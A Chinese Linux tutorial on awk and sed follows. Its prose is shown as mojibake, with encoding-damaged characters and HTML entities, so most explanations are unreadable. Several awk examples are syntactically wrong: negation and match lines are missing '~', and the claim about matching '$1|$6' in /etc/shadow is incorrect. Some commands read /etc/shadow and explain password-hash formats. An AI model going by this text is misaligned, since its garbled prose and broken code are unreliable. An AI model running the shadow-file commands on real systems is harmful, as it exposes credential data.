ä»»æ„å¤šä¸ªä»»æ„å­—ç¬¦ . : è½¬ä¹‰. o{2} : oé‡å¤ä¸¤æ¬¡ 10.3 awk æ–‡æœ¬åˆ†æå·¥å…·awkå¯¹æ–‡ä»¶è¿›è¡Œé€è¡Œè¯»å…¥ï¼Œé»˜è®¤ä»¥ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦å°†æ¯è¡Œåˆ‡ç‰‡ï¼Œåˆ‡å¼€çš„éƒ¨åˆ†å†è¿›è¡Œå„ç§åˆ†æå¤„ç†ï¼Œå³awkä¼šå¯¹æ–‡æœ¬ä¾æ¬¡å¯¹æ¯ä¸€è¡Œè¿›è¡Œå¤„ç†ï¼Œç„¶åè¾“å‡ºã€‚ awkæ˜¯è¡Œå¤„ç†å™¨,åœ¨å¤„ç†åºå¤§æ–‡ä»¶æ—¶ä¸ä¼šå‡ºç°å†…å­˜æº¢å‡ºæˆ–æ˜¯å¤„ç†ç¼“æ…¢çš„é—®é¢˜ï¼Œé€šå¸¸ç”¨æ¥æ ¼å¼åŒ–æ–‡æœ¬ä¿¡æ¯ã€‚ awkçš„ç”¨æ³•ï¼š awk å‚æ•° â€™ BEGIN{} &#x2F;&#x2F; {action1;action2} â€™ END{} æ–‡ä»¶å &#x2F;&#x2F;-F æŒ‡å®šåˆ†éš”ç¬¦;-f è°ƒç”¨è„šæœ¬ï¼Œ-v å®šä¹‰å˜é‡ï¼Œawkçš„æ ¼å¼ä¸­ï¼Œ-Fåç´§è·Ÿå•å¼•å·ï¼Œç„¶åé‡Œé¢å¯è‡ªå®šä¹‰è¾“å‡ºåˆ†éš”ç¬¦ï¼Œprintçš„åŠ¨ä½œè¦ç”¨ { } æ‹¬èµ·æ¥ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚printè¿˜å¯ä»¥æ‰“å°è‡ªå®šä¹‰çš„å†…å®¹ï¼Œä½†æ˜¯è‡ªå®šä¹‰çš„å†…å®¹è¦ç”¨â€œâ€åŒå¼•å·æ‹¬èµ·æ¥ã€‚ Begin{}: &#x2F;&#x2F;åˆå§‹åŒ–ä»£ç å—ï¼Œåœ¨å¯¹æ¯ä¸€è¡Œè¿›è¡Œå¤„ç†ä¹‹å‰ï¼Œåˆå§‹åŒ–ä»£ç ï¼Œä¸»è¦æ˜¯å¼•ç”¨å…¨å±€å˜é‡ï¼Œè®¾ç½®FSåˆ†éš”ç¬¦&#x2F;åŒ¹é…å†…å®¹&#x2F;: &#x2F;&#x2F; åŒ¹é…ä»£ç å—ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼ï¼›â€™$1&#x2F;me&#x2F;â€˜ä¸­ï¼Œè¡¨ç¤ºåŒ¹é…çš„æ„æ€ï¼Œè·å–ç¬¬ä¸€ä¸ªå­—æ®µå¹¶åŒ¹é…å…¶å&#x2F; &#x2F;å†…çš„å…³é”®å­—meï¼› {} : &#x2F;&#x2F; å‘½ä»¤ä»£ç å—ï¼ŒåŒ…å«ä¸€æ¡æˆ–å¤šæ¡å‘½ä»¤,å¤šæ¡å‘½ä»¤ç”¨ ; éš”å¼€ END{} : &#x2F;&#x2F;ç»“å°¾ä»£ç å—ï¼Œåœ¨å¯¹æ¯ä¸€è¡Œè¿›è¡Œå¤„ç†ä¹‹åå†æ‰§è¡Œçš„ä»£ç å—ï¼Œä¸»è¦æ˜¯è¿›è¡Œæœ€ç»ˆè®¡ç®—æˆ–è¾“å‡ºç»“å°¾æ‘˜è¦ä¿¡æ¯123456eg1ï¼š &#x2F;&#x2F;ç»Ÿè®¡ &#x2F;etc&#x2F;passwd æ–‡ä»¶ä¸­åŒ…å«rootè¡Œçš„æ€»æ•°#awk â€˜BEGIN{X&#x3D;0}&#x2F;root&#x2F;{X+&#x3D;1}END{print â€œI findâ€,X,â€œroot linesâ€}â€™ &#x2F;etc&#x2F;passwd eg2:æ˜¾ç¤º &#x2F;etc&#x2F;passwd ä¸­å«æœ‰ root çš„è¡Œawk â€˜&#x2F;root&#x2F;â€™ &#x2F;etc&#x2F;passwdeg3:ä»¥ : ä¸ºåˆ†éš”ï¼Œæ˜¾ç¤º&#x2F;etc&#x2F;passwdä¸­æ¯è¡Œçš„ç¬¬1å’Œç¬¬7ä¸ªå­—æ®µï¼ˆå¯ä»¥ç†è§£ä¸º1å’Œç¬¬7åˆ—ï¼‰awk -F â€œ:â€ â€˜{print $1,$7}â€™ &#x2F;etc&#x2F;passwdawk â€˜BEGIN{FS&#x3D;â€œ:â€}{print $1,$7}â€™ &#x2F;etc&#x2F;passwdeg4:ä»¥ : ä¸ºåˆ†éš”ï¼Œæ˜¾ç¤º&#x2F;etc&#x2F;passwdä¸­å«æœ‰ root çš„è¡Œçš„ç¬¬1å’Œç¬¬7ä¸ªå­—æ®µawk -F â€œ:â€ â€˜&#x2F;root&#x2F; {print $1,$7}â€™ &#x2F;etc&#x2F;passwdeg5:ä»¥ : ä¸ºåˆ†éš”ï¼Œæ˜¾ç¤º&#x2F;etc&#x2F;passwdä¸­ä»¥ root å¼€å¤´è¡Œçš„ç¬¬1å’Œç¬¬7ä¸ªå­—æ®µawk -F â€œ:â€ â€˜&#x2F;^root&#x2F; {print $1,$7}â€™ &#x2F;etc&#x2F;passwdeg6:ä»¥ : ä¸ºåˆ†éš”ï¼Œæ˜¾ç¤º&#x2F;etc&#x2F;passwdä¸­ç¬¬3ä¸ªå­—æ®µå¤§äº999çš„è¡Œçš„ç¬¬1å’Œç¬¬7ä¸ªå­—æ®µ awk -F â€œ:â€ â€˜$3&gt;999{print $1,$7}â€™ &#x2F;etc&#x2F;passwdç±»ä¼¼çš„è¿˜æœ‰ï¼šawk -F: â€˜$3&#x3D;&#x3D;â€600â€â€˜ passwd è¿™æ˜¯awkåŒ¹é…æ¡ä»¶æ“ä½œç¬¦çš„ç”¨æ³•ï¼Œç”¨é€»è¾‘ç¬¦å·åˆ¤æ–­çš„ï¼Œæ¯”å¦‚ â€˜&#x3D;&#x3D;â€™ å°±æ˜¯ç­‰äºï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸º â€˜ç²¾ç¡®åŒ¹é…â€™ å¦å¤–ä¹Ÿæœ‰ &gt;, â€˜&gt;&#x3D;, â€˜&lt;, â€˜&lt;&#x3D;, â€˜!&#x3D; ç­‰ç­‰ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œè‹¥æŠŠæ¯”è¾ƒçš„æ•°å­—ç”¨åŒå¼•å·å¼•èµ·æ¥åï¼Œé‚£ä¹ˆawkä¸ä¼šè®¤ä¸ºæ˜¯æ•°å­—ï¼Œè€Œè®¤ä¸ºæ˜¯å­—ç¬¦ï¼ŒåŠ å•å¼•å·å’Œä¸åŠ åˆ™è®¤ä¸ºæ˜¯æ•°å­—ã€‚è¿˜å¯ä»¥ä½¿ç”¨ &amp;&amp; â€œå¹¶ä¸”â€å’Œ || â€œæˆ–è€…â€ çš„æ„æ€ã€‚awk -F: â€˜$3&gt;$4 &amp;&amp; $7&#x3D;&#x3D;â€&#x2F;bin&#x2F;bashâ€â€˜ passwd12345eg7:ä»¥ : ä¸ºåˆ†éš”ï¼Œæ˜¾ç¤º&#x2F;etc&#x2F;passwdä¸­ç¬¬7ä¸ªå­—æ®µåŒ…å«bashçš„è¡Œçš„ç¬¬1å’Œç¬¬7ä¸ªå­—æ®µawk -F â€œ:â€ â€˜$7 ~ â€œbashâ€ {print $1,$7}â€™ &#x2F;etc&#x2F;passwdeg8:ä»¥ : ä¸ºåˆ†éš”ï¼Œæ˜¾ç¤º&#x2F;etc&#x2F;passwdä¸­ç¬¬7ä¸ªå­—æ®µä¸åŒ…å«bashçš„è¡Œçš„ç¬¬1å’Œç¬¬7ä¸ªå­—æ®µawk -F â€œ:â€ â€˜$7!â€œnologinâ€{print $1,$7}â€™ &#x2F;etc&#x2F;passwdeg9:ä»¥ : ä¸ºåˆ†éš”ï¼Œæ˜¾ç¤º$3&gt;999å¹¶ä¸”ç¬¬7ä¸ªå­—æ®µåŒ…å«bashçš„è¡Œçš„ç¬¬1å’Œç¬¬7ä¸ªå­—æ®µï¼Œéç³»ç»Ÿç”¨æˆ·çš„å¼‚å¸¸ç™»å½•æƒé™awk -F â€œ:â€ â€˜$3&gt;999&amp;&amp;$7â€œbashâ€{print $1,$7}â€™ &#x2F;etc&#x2F;passwdeg10:ä»¥ : ä¸ºåˆ†éš”ï¼Œæ˜¾ç¤º$3&gt;999æˆ–ç¬¬7ä¸ªå­—æ®µåŒ…å«bashçš„è¡Œçš„ç¬¬1å’Œç¬¬7ä¸ªå­—æ®µawk -F â€œ:â€ â€˜$3&gt;999||$7~â€œbashâ€{print $1,$7}â€™ &#x2F;etc&#x2F;passwdeg11ï¼šè·å–eth0ç½‘å¡çš„ipå’Œæ©ç ifconfig eth0|awk -F â€œ[ :]+â€ â€˜NR&#x3D;&#x3D;2{print $4 â€œ&#x2F;â€ $NF}â€™ &#x2F;&#x2F;[ :]+è¿™ä¸ªæ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œ+è¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªï¼Œè¿™é‡Œå°±è¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼æˆ–å†’å·; eg12:awk -F: â€˜&#x2F;root&#x2F; {print $1,$3} &#x2F;user&#x2F; {print $1,$3}â€™ passwd &#x2F;&#x2F;å¤šæ¬¡åŒ¹é…ï¼Œæœ¬ä¾‹ä¸­å…¨æ–‡åŒ¹é…åŒ…å«rootå…³é”®è¯çš„è¡Œï¼Œå†åŒ¹é…åŒ…å«userçš„è¡Œï¼Œæ‰“å°æ‰€åŒ¹é…çš„ç¬¬1ã€3æ®µã€‚ ã€å­—ç¬¦å«ä¹‰ã€‘ï¼š $0 è¡¨ç¤ºæ•´ä¸ªå½“å‰è¡Œ$1 æ¯è¡Œç¬¬ä¸€ä¸ªå­—æ®µNF å­—æ®µæ•°é‡,ç”¨åˆ†éš”ç¬¦åˆ†éš”åä¸€å…±æœ‰å¤šå°‘æ®µNR è¡Œæ•°,æ¯è¡Œçš„è®°å½•å·ï¼Œå¤šæ–‡ä»¶è®°å½•é€’å¢,{print NRâ€:â€NF}åˆ—å‡ºè¡Œå·ï¼Œä»¥å†’å·åˆ†éš”ï¼Œåˆ—å‡ºå…±æœ‰å¤šå°‘æ®µï¼›FNR ä¸NRç±»ä¼¼ï¼Œä¸è¿‡å¤šæ–‡ä»¶è®°å½•ä¸é€’å¢ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½ä»1å¼€å§‹\\t åˆ¶è¡¨ç¬¦\\n æ¢è¡Œç¬¦FS BEGINæ—¶å®šä¹‰åˆ†éš”ç¬¦,å†…å»ºå˜é‡FSä¿å­˜è¾“å…¥åŸŸåˆ†éš”ç¬¦çš„å€¼ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼æˆ–tabã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡-Få‘½ä»¤è¡Œé€‰é¡¹ä¿®æ”¹FSçš„å€¼ã€‚å¦‚$ awk -F: â€˜{print $1,$5}â€™ testå°†æ‰“å°ä»¥å†’å·ä¸ºåˆ†éš”ç¬¦çš„ç¬¬ä¸€ï¼Œç¬¬äº”åˆ—çš„å†…å®¹ã€‚å¯ä»¥åŒæ—¶ä½¿ç”¨å¤šä¸ªåŸŸåˆ†éš”ç¬¦ï¼Œè¿™æ—¶åº”è¯¥æŠŠåˆ†éš”ç¬¦å†™æˆæ”¾åˆ°æ–¹æ‹¬å·ä¸­ï¼Œå¦‚$awk -Fâ€™[ :\\t]â€™ â€˜{print $1,$3}â€™ testï¼Œè¡¨ç¤ºä»¥ç©ºæ ¼ã€å†’å·å’Œtabä½œä¸ºåˆ†éš”ç¬¦ã€‚RS è¾“å…¥çš„è®°å½•åˆ†éš”ç¬¦ï¼Œ é»˜è®¤ä¸ºæ¢è¡Œç¬¦(å³æ–‡æœ¬æ˜¯æŒ‰ä¸€è¡Œä¸€è¡Œè¾“å…¥)~ åŒ…å«!~ ä¸åŒ…å«&#x3D;&#x3D; ç­‰äºï¼Œå¿…é¡»å…¨éƒ¨ç›¸ç­‰ï¼Œç²¾ç¡®æ¯”è¾ƒ!&#x3D; ä¸ç­‰äºï¼Œç²¾ç¡®æ¯”è¾ƒ&amp;&amp; é€»è¾‘ä¸|| é€»è¾‘æˆ–+ åŒ¹é…æ—¶è¡¨ç¤º1ä¸ªæˆ–1ä¸ªä»¥ä¸Š&#x2F;[0-9][0-9]+&#x2F; ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šæ•°å­—&#x2F;[0-9][0-9]*&#x2F; ä¸€ä¸ªæˆ–ä¸€ä¸ªä»¥ä¸Šæ•°å­—OFS è‡ªå®šä¹‰è¾“å‡ºå­—æ®µåˆ†éš”ç¬¦ï¼Œ é»˜è®¤ä¹Ÿæ˜¯ç©ºæ ¼ï¼Œå¯ä»¥æ”¹ä¸ºå…¶ä»–çš„ï¼Œâ€™OFS&#x3D;â€#â€{print $3,$4}â€™ï¼Œåˆ†éš”ç¬¦éœ€è¦ç”¨åŒå¼•å·æ‹¬èµ·æ¥ORS è¾“å‡ºçš„è®°å½•åˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦,å³å¤„ç†ç»“æœä¹Ÿæ˜¯ä¸€è¡Œä¸€è¡Œè¾“å‡ºåˆ°å±å¹•-F [:#&#x2F;] å®šä¹‰äº†ä¸‰ä¸ªåˆ†éš”ç¬¦123456789101112131415161718192021ã€print æ‰“å°ã€‘ï¼šprint æ˜¯ awkæ‰“å°æŒ‡å®šå†…å®¹çš„ä¸»è¦å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ç”¨ printf awk â€˜{print}â€™ &#x2F;etc&#x2F;passwd ç­‰æ•ˆäº awk â€˜{print $0}â€™ &#x2F;etc&#x2F;passwdawk â€˜{print â€œ â€œ}â€™ &#x2F;etc&#x2F;passwd ä¸è¾“å‡ºpasswdçš„å†…å®¹ï¼Œè€Œæ˜¯è¾“å‡ºç›¸åŒä¸ªæ•°çš„ç©ºè¡Œï¼Œè¿›ä¸€æ­¥è§£é‡Šäº†awkæ˜¯ä¸€è¡Œä¸€è¡Œå¤„ç†æ–‡æœ¬awk â€˜{print â€œaâ€}â€™ &#x2F;etc&#x2F;passwd &#x2F;&#x2F;è¾“å‡ºç›¸åŒä¸ªæ•°çš„aè¡Œï¼Œä¸€è¡Œåªæœ‰ä¸€ä¸ªaå­—æ¯awk -F: â€˜{print $1}â€™ &#x2F;etc&#x2F;passwd ç­‰æ•ˆäº awk -F â€œ:â€ â€˜{print $1}â€™ &#x2F;etc&#x2F;passwdawk -F: â€˜{print $1 $2}â€™ &#x2F;&#x2F;è¾“å…¥å­—æ®µ1,2ï¼Œä¸­é—´ä¸åˆ†éš”awk -F: â€˜{print $1,$3,$6}â€™ OFS&#x3D;â€œ\\tâ€ &#x2F;etc&#x2F;passwd è¾“å‡ºå­—æ®µ1,3,6ï¼Œ ä»¥åˆ¶è¡¨ç¬¦ä½œä¸ºè¾“å‡ºåˆ†éš”ç¬¦awk -F: â€˜{print $1; print $2}â€™ &#x2F;etc&#x2F;passwd è¾“å…¥å­—æ®µ1,2ï¼Œåˆ†è¡Œè¾“å‡ºawk -F: â€˜{print $1 â€œâ€ $2}â€™ &#x2F;etc&#x2F;passwd è¾“å…¥å­—æ®µ1,2ï¼Œä¸­é—´ä»¥åˆ†éš”awk -F: â€˜{print â€œname:â€$1â€\\tid:â€$3}â€™ &#x2F;etc&#x2F;passwd è‡ªå®šä¹‰æ ¼å¼è¾“å‡ºå­—æ®µ1,2 awk -F: â€˜{print NF}â€™ &#x2F;etc&#x2F;passwd æ˜¾ç¤ºæ¯è¡Œæœ‰å¤šå°‘å­—æ®µ(å¤šå°‘ä¸ªåˆ†æ®µ&#x2F;å¤šå°‘åˆ—)awk -F: â€˜NF&gt;2{print }â€™ &#x2F;etc&#x2F;passwd å°†æ¯è¡Œå­—æ®µæ•°å¤§äº2çš„æ‰“å°å‡ºæ¥awk -F: â€˜NR&#x3D;&#x3D;5{print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡º&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­çš„ç¬¬5è¡Œawk -F: â€˜NR&#x3D;&#x3D;5|NR&#x3D;&#x3D;6{print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡º&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­çš„ç¬¬5è¡Œå’Œç¬¬6è¡Œawk -F: â€˜NR!&#x3D;1{print}â€™ &#x2F;etc&#x2F;passwd ä¸æ˜¾ç¤ºç¬¬ä¸€è¡Œawk -F: â€˜{print &gt; â€œ1.txtâ€}â€™ &#x2F;etc&#x2F;passwd è¾“å‡ºåˆ°æ–‡ä»¶ä¸­awk -F: â€˜{print}â€™ &#x2F;etc&#x2F;passwd &gt; 2.txt ä½¿ç”¨é‡å®šå‘è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ ã€å­—ç¬¦åŒ¹é…ã€‘ï¼š awk -F: â€˜&#x2F;root&#x2F;{print }â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­å«æœ‰rootçš„è¡Œawk -F: â€˜&#x2F;â€˜$Aâ€™&#x2F;{print }â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­å«æœ‰å˜é‡ $Açš„è¡Œawk -F: â€˜!&#x2F;root&#x2F;{print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ä¸å«æœ‰rootçš„è¡Œawk -F: â€˜&#x2F;root|tom&#x2F;{print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­å«æœ‰rootæˆ–è€…tomçš„è¡Œawk -F: â€˜&#x2F;mail&#x2F;,mysql&#x2F;{print}â€™ test æ‰“å°å‡ºæ–‡ä»¶ä¸­å«æœ‰ mailmysql çš„è¡Œï¼Œä»£è¡¨æœ‰0ä¸ªæˆ–ä»»æ„å¤šä¸ªå­—ç¬¦awk -F: â€˜&#x2F;^[2][7][7]*&#x2F;{print}â€™ test æ‰“å°å‡ºæ–‡ä»¶ä¸­ä»¥27å¼€å¤´çš„è¡Œï¼Œå¦‚27,277,27gff ç­‰ç­‰awk -F: â€˜$1&#x2F;root&#x2F;{print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯rootçš„è¡Œawk -F: â€˜($1&#x3D;&#x3D;â€rootâ€){print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯rootçš„è¡Œï¼Œä¸ä¸Šé¢çš„ç­‰æ•ˆawk -F: â€˜$1!&#x2F;root&#x2F;{print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯rootçš„è¡Œawk -F: â€˜($1!&#x3D;â€rootâ€){print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯rootçš„è¡Œï¼Œä¸ä¸Šé¢çš„ç­‰æ•ˆawk -F: â€˜$1&#x2F;root|ftp&#x2F;{print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯rootæˆ–ftpçš„è¡Œawk -F: â€˜($1&#x3D;&#x3D;â€rootâ€||$1&#x3D;&#x3D;â€ftpâ€){print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯rootæˆ–ftpçš„è¡Œï¼Œä¸ä¸Šé¢çš„ç­‰æ•ˆawk -F: â€˜$1!&#x2F;root|ftp&#x2F;{print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯rootæˆ–ä¸æ˜¯ftpçš„è¡Œawk -F: â€˜($1!&#x3D;â€rootâ€||$1!&#x3D;â€ftpâ€){print}â€™ &#x2F;etc&#x2F;passwd æ‰“å°å‡ºæ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯rootæˆ–ä¸æ˜¯ftpçš„è¡Œï¼Œä¸ä¸Šé¢ç­‰æ•ˆawk -F: â€˜{if($1~&#x2F;mail&#x2F;) {print $1} else {print $2}}â€™ &#x2F;etc&#x2F;passwd å¦‚æœç¬¬ä¸€ä¸ªå­—æ®µæ˜¯mailï¼Œåˆ™æ‰“å°ç¬¬ä¸€ä¸ªå­—æ®µï¼Œå¦åˆ™æ‰“å°ç¬¬2ä¸ªå­—æ®µ123456789101112131415awk â€˜&#x2F;$1|$6&#x2F;{print $1}â€™ &#x2F;etc&#x2F;shadowawk â€˜&#x2F;$6&#x2F;{print $1}â€™ &#x2F;etc&#x2F;shadow ä¸Šè¿°ä¸¤æ¡å‘½ä»¤ç­‰æ•ˆï¼Œå…¶ä¸­æ­£åˆ™è¡¨è¾¾å¼â€™&#x2F;$1|$6&#x2F;{print $1}â€™è¡¨ç¤ºä½¿ç”¨åŒ¹é…æ¨¡å¼â€™&#x2F;åŒ¹é…æ¨¡å¼&#x2F;â€˜ï¼Œ|è¡¨å¯ä»¥åŒ¹é…å¤šä¸ªè§„åˆ™ï¼ŒæŠ“å–$1æˆ–$6å­—ç¬¦çš„è¡Œï¼Œ$0å®ƒè¡¨ç¤ºæ•´è¡Œï¼Œ$nè¡¨ç¬¬nä¸ªå­—æ®µï¼Œå› æ‰“å°åˆ†æ®µé»˜è®¤åˆ†éš”ç¬¦ä¸ºç©ºæ ¼ï¼Œæ‰€ä»¥$1å°±ç›¸å½“äºæ•´è¡Œäº†ï¼Œå…³äºå£ä»¤ç‰¹æ€§å¦‚ä¸‹ï¼š æ˜Ÿå·ä»£è¡¨å¸å·è¢«é”å®šï¼Œå°†æ— æ³•ç™»å½•ï¼›åŒå¹å·è¡¨ç¤ºè¿™ä¸ªå¯†ç å·²ç»è¿‡æœŸäº†ï¼Œ å¦‚æœæ˜¯$x$xxxxxxxx$çš„å½¢å¼ï¼Œåˆ™ä»£è¡¨å¯†ç æ­£å¸¸ã€‚ $6$å¼€å¤´çš„ï¼Œè¡¨æ˜æ˜¯ç”¨SHA-512åŠ å¯†çš„ï¼Œå¯†æ–‡é•¿åº¦86ï¼Œç¤ºä¾‹ä¸­â€˜5NAhdLZNâ€™ä¸ºsaltå€¼ï¼Œæ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼Œä¾›åŠ å¯†ä½¿ç”¨ $1$ è¡¨æ˜æ˜¯ç”¨MD5åŠ å¯†çš„ï¼Œå¯†æ–‡é•¿åº¦22ä¸ªå­—ç¬¦ $2$ æ˜¯ç”¨BlowfishåŠ å¯†çš„ï¼Œ $5$ æ˜¯ç”¨ SHA-256åŠ å¯†çš„ï¼Œå¯†æ–‡é•¿åº¦43 12345678910æ ¼å¼åŒ–è¾“å‡ºawk â€˜{printf â€œ%-5s %.2dâ€,$1,$2}â€™ test printf è¡¨ç¤ºæ ¼å¼è¾“å‡º%æ ¼å¼åŒ–è¾“å‡ºåˆ†éš”ç¬¦-8è¡¨ç¤ºé•¿åº¦ä¸º8ä¸ªå­—ç¬¦sè¡¨ç¤ºå­—ç¬¦ä¸²ç±»å‹ï¼Œdè¡¨ç¤ºå°æ•° 10.4 sedï¼šæµç¼–è¾‘å™¨sedæŠŠå½“å‰å¤„ç†çš„è¡Œå­˜å‚¨åœ¨ä¸€ä¸ªç§°ä¸ºâ€œæ¨¡å¼ç©ºé—´â€ï¼ˆpattern spaceï¼‰çš„ä¸´æ—¶ç¼“å†²åŒºä¸­ã€‚ sed å¤„ç†æ•°æ®ä¹‹å‰ï¼Œéœ€è¦é¢„å…ˆæä¾›ä¸€ç»„è§„åˆ™ï¼Œsed ä¼šæŒ‰ç…§æ­¤è§„åˆ™æ¥ç¼–è¾‘æ•°æ®ã€‚æ­¤å‘½ä»¤çš„å…³é”®åœ¨äºæŒæ¡å„å¼å„æ ·çš„è„šæœ¬å‘½ä»¤åŠæ¨¡å¼åŒ¹é…ï¼›sedæ¨¡å¼æ˜¯åŒ¹é…è¡Œï¼Œè€Œéå¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œæ“ä½œæ—¶å¯¹åŒ¹é…èˆªçš„åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ¨¡å¼ä¸­yå¯è¿›è¡Œå­—ç¬¦æ›¿æ¢ï¼Œå®ƒä¼šå¯¹å•ä¸ªå­—ç¬¦ä¸€ä¸€æ˜ å°„åŒ¹é…æ›¿æ¢ã€‚ ã€è¯­æ³•ã€‘ï¼š1ï¼‰sedçš„å‘½ä»¤æ ¼å¼ï¼šsed [options] â€˜commandâ€™ file(s); &#x2F;&#x2F;é»˜è®¤ç›´æ¥åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸Šè¿›è¡ŒsedåŠ¨ä½œç¼–è¾‘ 2ï¼‰sedçš„è„šæœ¬æ ¼å¼ï¼šsed [options] -f scriptfile file(s); &#x2F;&#x2F;-fé€‰é¡¹ï¼Œå°†sedçš„åŠ¨ä½œå†™åœ¨ä¸€ä¸ªæ–‡ä»¶å†…ï¼Œç”¨â€“f filename æ‰§è¡Œfilenameå†…çš„sedåŠ¨ä½œ; æ³¨æ„ï¼šå¯¹äº&#x2F;pattern&#x2F;commandï¼Œå¿…é¡»ç”¨æ­£æ–œçº¿å°†è¦æŒ‡å®šçš„ pattern å°èµ·æ¥ï¼Œsed ä¼šå°†è¯¥å‘½ä»¤ä½œç”¨åˆ°åŒ…å«æŒ‡å®šæ–‡æœ¬æ¨¡å¼çš„è¡Œä¸Šã€‚å‘½ä»¤æ‰§è¡Œæ•°æ®çš„é¡ºåºå¦‚ä¸‹ï¼š 1&gt;æ¯æ¬¡ä»…è¯»å–ä¸€è¡Œå†…å®¹ï¼›2&gt;æ ¹æ®æä¾›çš„è§„åˆ™å‘½ä»¤åŒ¹é…å¹¶ä¿®æ”¹æ•°æ®ã€‚æ³¨æ„ï¼Œ sed é»˜è®¤ä¸ä¼šç›´æ¥ä¿®æ”¹æºæ–‡ä»¶æ•°æ®ï¼Œè€Œæ˜¯ä¼šå°†æ•°æ®å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­ï¼Œä¿®æ”¹ä¹Ÿä»…é™äºç¼“å†²åŒºä¸­çš„æ•°æ®ï¼›3&gt;å°†æ‰§è¡Œç»“æœè¾“å‡ºã€‚å½“ä¸€è¡Œæ•°æ®åŒ¹é…å®Œæˆåï¼Œå®ƒä¼šç»§ç»­è¯»å–ä¸‹ä¸€è¡Œæ•°æ®ï¼Œå¹¶é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°å°†æ–‡ä»¶ä¸­æ‰€æœ‰æ•°æ®å¤„ç†å®Œæ¯•ã€‚ ã€é€‰é¡¹ã€‘ï¼š-i ï¼šç›´æ¥ä¿®æ”¹æ–‡ä»¶å†…å®¹;-n ï¼šåªæ‰“å°æ¨¡å¼åŒ¹é…çš„è¡Œï¼›é»˜è®¤æƒ…å†µä¸‹ï¼Œsed ä¼šåœ¨æ‰€æœ‰çš„è„šæœ¬æŒ‡å®šæ‰§è¡Œå®Œæ¯•åï¼Œä¼šè‡ªåŠ¨è¾“å‡ºå¤„ç†åçš„å†…å®¹ï¼Œè€Œè¯¥é€‰é¡¹ä¼šå±è”½å¯åŠ¨è¾“å‡ºï¼Œéœ€ä½¿ç”¨ print å‘½ä»¤æ¥å®Œæˆè¾“å‡ºã€‚-r ï¼šæ”¯æŒæ‰©å±•è¡¨è¾¾å¼;-e è„šæœ¬å‘½ä»¤: è¯¥é€‰é¡¹ä¼šå°†å…¶åè·Ÿçš„è„šæœ¬å‘½ä»¤æ·»åŠ åˆ°å·²æœ‰çš„å‘½ä»¤ä¸­-f è„šæœ¬å‘½ä»¤æ–‡ä»¶: è¯¥é€‰é¡¹ä¼šå°†å…¶åæ–‡ä»¶ä¸­çš„è„šæœ¬å‘½ä»¤æ·»åŠ åˆ°å·²æœ‰çš„å‘½ä»¤ä¸­ ã€æ¨¡å¼å‚æ•°ã€‘ï¼šaï¼ˆæˆ– iï¼‰+\\æ–°æ–‡æœ¬å†…å®¹ï¼š åœ¨å½“å‰è¡Œä¸‹é¢æ’å…¥æ–‡æœ¬;i\\ +è¦æ’å…¥çš„æ–°æ–‡æœ¬ ï¼š åœ¨å½“å‰è¡Œä¸Šé¢æ’å…¥æ–‡æœ¬;c+ç”¨äºæ›¿æ¢çš„æ–°æ–‡æœ¬ï¼š æŠŠé€‰å®šçš„è¡Œæ”¹ä¸ºæ–°çš„æ–‡æœ¬;y&#x2F;inchars&#x2F;outchars&#x2F;ï¼šè½¬æ¢å‘½ä»¤ä¼šå¯¹ inchars å’Œ outchars å€¼è¿›è¡Œä¸€å¯¹ä¸€çš„æ˜ å°„ï¼Œå³ inchars ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¼šè¢«è½¬æ¢ä¸º outchars 